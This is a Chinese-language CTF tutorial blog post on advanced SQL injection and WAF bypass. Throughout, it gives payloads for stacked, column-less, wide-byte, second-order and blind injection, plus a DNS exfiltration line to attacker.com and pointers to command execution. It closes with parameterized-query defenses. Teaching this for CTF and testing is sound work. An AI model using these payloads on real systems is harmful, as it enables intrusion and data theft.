---
title: SQL注入讲解—高级注入技术与WAF深度绕过
date: 2026-09-12 16:00:00
categories: [CTF, Web安全]
tags: [CTF, Web, SQL注入, WAF绕过, 堆叠注入, 无列名注入]
cover: /img/bg10.jpg
---

## 从基础到高级的分水岭

基础 SQL 注入（UNION 查询、布尔盲注、时间盲注、报错注入）是每个 Web 安全从业者的入门必修课。但在真实 CTF 比赛和渗透测试中，遇到的往往是更复杂的场景：关键字被过滤、WAF 拦截、堆叠注入、无列名注入、宽字节注入、二次注入、预编译绕过、MySQL 特性利用等。

本文聚焦高级 SQL 注入技术，假设读者已经掌握基础注入流程，重点讲解那些能在高手对决中拉开差距的技巧。

<!-- more -->

## 堆叠注入的深度利用

堆叠注入（Stacked Queries）允许用分号 `;` 在一条语句后拼接多条独立语句。是否可用取决于数据库驱动：PHP 的 `mysqli_multi_query()` 支持，`mysqli_query()` 不支持；Python 的 pymysql 默认不支持，但可以通过特定参数开启。

### 场景 1：预编译绕过关键字过滤

当 `select`、`from`、`where` 等关键字被严格过滤时，用预编译（PREPARE）拼接字符串执行：

```sql
-- 基础预编译
SET @sql = concat('SEL', 'ECT * FROM users');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
```

### 场景 2：十六进制绕过

当连字符串拼接都被过滤时，用十六进制表示完整的 SQL 语句：

```sql
-- "SELECT * FROM users" 的十六进制
SET @sql = 0x53454c454354202a2046524f4d207573657273;
PREPARE stmt FROM @sql;
EXECUTE stmt;
```

### 场景 3：修改表结构注入 flag

当目标是把 flag 写入一个可查询的表中时：

```sql
-- 在已知表中添加一列，把 flag 写进去
; ALTER TABLE users ADD COLUMN flag VARCHAR(100);
; UPDATE users SET flag = (SELECT load_file('/flag')) WHERE id=1;
-- 然后正常查询 users 表就能看到 flag
```

### 场景 4：HANDLER 语句绕过

MySQL 的 HANDLER 语句可以不通过 SELECT 直接打开表读取数据，当 `select` 被过滤时：

```sql
; HANDLER users OPEN;
; HANDLER users READ FIRST;
; HANDLER users READ NEXT;
; HANDLER users CLOSE;
```

## 无列名注入

当 `information_schema` 被完全过滤，无法获取表名和列名时，需要无列名注入技术。

### 方法 1：JOIN 报错获取列名

```sql
-- 用 JOIN 产生列名冲突报错
?sort=(SELECT * FROM users)a JOIN (SELECT * FROM users)b
-- 报错信息：Duplicate column name 'id'
-- 逐个获取所有列名
```

### 方法 2：数字代替列名

```sql
-- 用反引号数字代替列名
?sort=`1`  -- 第一列
?sort=`2`  -- 第二列

-- 或者用 SELECT 1,2 UNION 的方式
?id=-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--+
```

### 方法 3：无列名盲注

```sql
-- 用整行比较来逐位猜解数据，不需要知道列名
?id=1 AND (SELECT * FROM users LIMIT 1) > ('a',0,0,0,0,0)
-- 逐列逐字符猜解
```

### 方法 4：sys 库替代 information_schema

MySQL 5.7+ 有 `sys` 系统库，可以替代 information_schema：

```sql
-- 查表名
SELECT table_name FROM sys.schema_auto_increment_columns WHERE table_schema=database()

-- 查索引
SELECT * FROM sys.schema_index_statistics WHERE table_schema=database()
```

### 方法 5：innodb_table_stats

MySQL 8.0+ 中 `information_schema` 被进一步限制时，可以用 InnoDB 的数据字典表：

```sql
SELECT NAME FROM mysql.innodb_table_stats WHERE database_name=database()
```

## 宽字节注入深度解析

宽字节注入发生在数据库使用 GBK 等多字节编码，且应用层用 `addslashes()` 或 `magic_quotes_gpc` 转义单引号的场景。

### 原理

`addslashes()` 会把单引号 `'`（0x27）转义为 `\'`（0x5c 0x27）。但在 GBK 编码中，`0xdf 0x5c` 是一个合法的 GBK 字符（運）。当输入 `%df'` 时：

1. `addslashes()` 把 `'` 转义为 `\'`，输入变成 `%df%5c%27`
2. MySQL 用 GBK 解码时，`%df%5c` 被解释为一个 GBK 字符 `運`
3. 剩下的 `%27`（单引号）逃逸出来，成功闭合

### payload

```
?id=1%df' UNION SELECT 1,2--+
```

### 进阶：其他多字节编码

- **GB2312**：类似 GBK，但合法字符范围不同
- **BIG5**：繁体中文编码，同样存在宽字节问题
- **Shift-JIS**：日文编码

关键是找到一个高位字节（>0x80）和 `0x5c` 组合成合法字符的编码。

## 二次注入的完整链路

二次注入（Second-Order SQL Injection）是指注入 payload 先被存入数据库，然后在另一个查询中被读取并拼接执行。它的难点在于找到数据从输入到数据库再到查询的完整链路。

### 典型场景

1. 用户注册时，用户名为 `admin'--`，被转义后存入数据库（数据库中存的是 `admin'--`）
2. 用户登录后，应用从数据库读取用户名，拼接到另一个 SQL 中（如修改密码的查询）
3. 此时用户名中的 `'--` 闭合了 SQL 语句，注入触发

### 利用示例

```sql
-- 注册用户名：admin'#
-- 数据库中存储：admin'#

-- 修改密码时的查询（存在漏洞）
UPDATE users SET password='newpass' WHERE username='admin'#' AND password='oldpass'
-- 实际执行：UPDATE users SET password='newpass' WHERE username='admin'
-- # 后面的内容被注释，oldpass 检查被绕过
```

### 挖掘方法

1. 追踪所有用户输入的存储位置
2. 找到从数据库读取这些数据并拼接到 SQL 的地方
3. 构造 payload，确保存储时不触发，但读取时触发

## MySQL 特性利用

### 1. 报错注入的高级用法

#### updatexml 长度限制绕过

updatexml 最多显示 32 个字符，超过需要分段：

```sql
-- 分段读取
AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM users),1,31),0x7e),1)
AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM users),32,31),0x7e),1)
```

#### extractvalue 双写绕过

当 `updatexml` 被过滤时用 `extractvalue`，当两者都被过滤时：

```sql
-- 用 geometrycollection 等函数报错
AND geometrycollection((SELECT * FROM (SELECT * FROM users)a))
-- polygon、multipoint、linestring 等空间函数都可以报错
```

### 2. 布尔盲注的加速技巧

#### 二分法 + 位运算

```sql
-- 直接猜 ASCII 码的每一位，比逐字符快
AND (SELECT ascii(substr(username,1,1)) FROM users LIMIT 1) & 1 = 1
AND (SELECT ascii(substr(username,1,1)) FROM users LIMIT 1) & 2 = 2
-- 8 次请求确定一个字符（2^8=256）
```

#### 正则盲注

```sql
-- 用正则表达式逐位匹配
AND (SELECT username FROM users LIMIT 1) REGEXP '^a'
AND (SELECT username FROM users LIMIT 1) REGEXP '^ad'
```

### 3. 时间盲注的替代方案

当 `sleep()` 被过滤时：

```sql
-- BENCHMARK
AND IF(condition, BENCHMARK(10000000,MD5('a')),0)

-- 笛卡尔积延时（大表 JOIN）
AND IF(condition, (SELECT count(*) FROM information_schema.tables a, information_schema.tables b, information_schema.tables c),0)

-- GET_LOCK 竞争
AND GET_LOCK('a',5)  -- 如果锁被占用，等待 5 秒
```

### 4. DNS 外带（OOB）

当布尔和时间盲注都太慢时，用 DNS 外带把数据带出来：

```sql
-- Windows 下用 LOAD_FILE 触发 DNS 查询
AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))

-- 用 select ... into outfile 配合 DNS
-- 或者用 xp_cmdshell（MSSQL）
```

需要一个可控的 DNS 服务器（ceye.io、dnslog.cn）接收查询。

## WAF 深度绕过

### 1. 解析差异绕过

WAF 和后端应用对同一个 HTTP 请求的解析可能不同，利用这种差异绕过：

#### 参数污染（HPP）

```
?id=1&id=2 UNION SELECT 1,2--+
```

有些 WAF 取第一个参数（id=1），后端取第二个参数（id=2 UNION...）。

#### 参数分块

```
?id=1 UNION/*&id=*/SELECT 1,2--+
```

WAF 看到的是 `id=1 UNION/*` 和 `id=*/SELECT 1,2--+`，都不完整；后端拼接后是完整的注入。

#### HTTP 走私

利用 CL.TE 或 TE.CL 的请求走私，让 WAF 和后端看到不同的请求体。

### 2. 编码绕过

#### Unicode 编码

```
?id=1%u0027%20UNION%u0020SELECT--+
```

有些 WAF 不解码 `%u` 编码，后端的 IIS/ASP 会解码。

#### 双重 URL 编码

```
?id=1%2527%2520UNION%2520SELECT--+
```

WAF 解码一次看到 `%27`（不认为是单引号），后端解码两次看到 `'`。

#### HTML 实体编码

在某些上下文中（如搜索结果回显在 HTML 中），WAF 可能不解码 HTML 实体：

```
?id=1&apos; UNION SELECT 1,2--+
```

### 3. 语法混淆

#### 大小写 + 注释混合

```
?id=1 UnIoN/*xxx*/SeLeCt/*yyy*/1,2--+
```

#### 关键字拆分

```
?id=1 UNI/**/ON SEL/**/ECT 1,2--+
```

#### 空白字符替代

```
?id=1%0bUNION%0cSELECT%091,2--+
```

`%09`(tab)、`%0a`(换行)、`%0b`(垂直tab)、`%0c`(换页)、`%0d`(回车) 都可以代替空格。

### 4. 等价函数/语法替换

| 被过滤 | 替代 |
|--------|------|
| `=` | `LIKE`、`REGEXP`、`!=`、`>`、`<` |
| `AND` | `&&` |
| `OR` | `||` |
| `空格` | `/**/`、`%09`、括号 |
| `SUBSTR` | `MID`、`SUBSTRING`、`LEFT` |
| `DATABASE()` | `SCHEMA()` |
| `GROUP_CONCAT` | `CONCAT_WS`、`CONCAT` |
| `SLEEP()` | `BENCHMARK()` |
| `information_schema` | `sys`、`mysql.innodb_table_stats` |
| `SELECT` | `HANDLER`、预编译、`TABLE` |
| `WHERE` | `HAVING`、`ORDER BY`、`LIMIT` |

### 5. 内联注释绕过

```sql
?id=1 /*!UNION*/ /*!SELECT*/ 1,2--+
?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2--+
```

MySQL 的内联注释 `/*! ... */` 中的内容会被 MySQL 执行，但 WAF 可能不识别。带版本号的 `/*!50000 ... */` 表示 MySQL >= 5.0.0 时执行。

## 各数据库高级特性

### MySQL

- `LOAD_FILE()`：读文件（需要 FILE 权限和 secure_file_priv 配置）
- `INTO OUTFILE` / `INTO DUMPFILE`：写文件（写 webshell）
- `sys_exec()` / `sys_eval()`：UDF 执行系统命令
- `xp_cmdshell`：MSSQL 的命令执行
- `COPY ... FROM PROGRAM`：PostgreSQL 的命令执行

### MSSQL

- `xp_cmdshell`：执行系统命令
- `xp_regread` / `xp_regwrite`：注册表操作
- `OPENROWSET`：跨服务器查询
- `sp_addlinkedsrvlogin`：链接服务器
- `WAITFOR DELAY`：时间盲注
- `convert()` 报错注入

### PostgreSQL

- `COPY ... FROM PROGRAM`：执行命令（9.3+）
- `pg_read_file()`：读文件
- `pg_ls_dir()`：列目录
- `dblink`：跨数据库查询
- `CREATE EXTENSION`：加载扩展

### Oracle

- `UTL_HTTP.REQUEST`：HTTP 请求（SSRF）
- `DBMS_XSLPROCESSOR.READ2CLOB`：读文件
- `DBMS_SCHEDULER`：执行命令
- `XMLTYPE`：报错注入
- 必须用 `FROM dual` 才能 SELECT 常量

## 实战：无回显堆叠注入拿 flag

这是一个典型的高级 CTF 场景：存在堆叠注入，但无回显，`select` 被过滤，`information_schema` 被过滤。

### 解题思路

1. 用堆叠注入修改表结构，把 flag 写入已知表
2. 用报错注入或时间盲注读取数据
3. 或者用 `LOAD_FILE` 直接读 flag 文件

### payload

```sql
-- 1. 探测表结构（用 HANDLER 或报错）
; HANDLER users OPEN; HANDLER users READ FIRST;

-- 2. 如果知道有 users 表，添加 flag 列
; ALTER TABLE users ADD COLUMN f VARCHAR(200);

-- 3. 把 flag 写进去（用 load_file）
; UPDATE users SET f = (SELECT load_file('/flag')) WHERE id=1;

-- 4. 用报错注入读取 f 列
1' AND updatexml(1,concat(0x7e,(SELECT f FROM users LIMIT 1),0x7e),1)--+
```

## 防御的本质

SQL 注入的根本防御是**参数化查询（预编译）**，把 SQL 结构和数据分开。任何基于黑名单/过滤的防御都可以被绕过——因为 SQL 的语法太灵活，编码、注释、等价函数、数据库特性的组合无穷无尽。

纵深防御：
1. **参数化查询**：根本防御
2. **输入验证**：白名单校验，数字型参数只允许数字
3. **最小权限**：数据库账号只给必要权限，禁止 FILE、SUPER 等危险权限
4. **WAF**：作为额外一层，但不依赖
5. **错误信息不回显**：生产环境关闭详细错误
6. **定期审计**：代码审计 + 动态扫描（SQLMap）

## 总结

高级 SQL 注入的核心是**理解数据库的内部机制和语法灵活性**。从堆叠注入的预编译绕过，到无列名注入的 JOIN 报错，从宽字节注入的编码特性，到二次注入的数据链路，每一种高级技术都是在利用数据库的某个特性或实现细节。

WAF 绕过的本质是**解析差异**——WAF 和后端对同一个请求的解析方式不同，利用这种差异让 WAF 看到的是无害内容，后端看到的是注入 payload。

掌握高级 SQL 注入需要：深入理解各种数据库的特性、积累大量绕过 payload、培养对解析差异的敏感度。这是一个需要大量实战积累的领域，没有捷径。
